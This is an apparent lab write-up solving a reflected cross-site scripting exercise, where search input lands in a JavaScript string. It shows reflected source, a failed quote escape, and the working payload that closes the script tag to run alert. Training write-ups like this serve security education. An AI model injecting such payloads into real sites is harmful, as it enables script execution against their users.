# Description

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

# Solution

First, let's see where our input goes.

```python
<script>
  var searchTerms = 'test';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Let's enter the word “test” and see that our input goes into the JavaScript function.

The first question is whether we can get out of this function. 

let's introduce  `' alert(123)`

```python
<script>
  var searchTerms = '\' alert(123)';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
And we will see that our input was shielded even if we try to shield / then we will also fail. 

But we can see that we are in `<script>`, so we can try to exit it and create a new one.

```python
</script><script>alert(123)</script>
```

And we successfully managed to carry out our attack.

This is what the source code looks like after

```python
<script>
                        var searchTerms = '</script><script>alert(123)</script>';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```
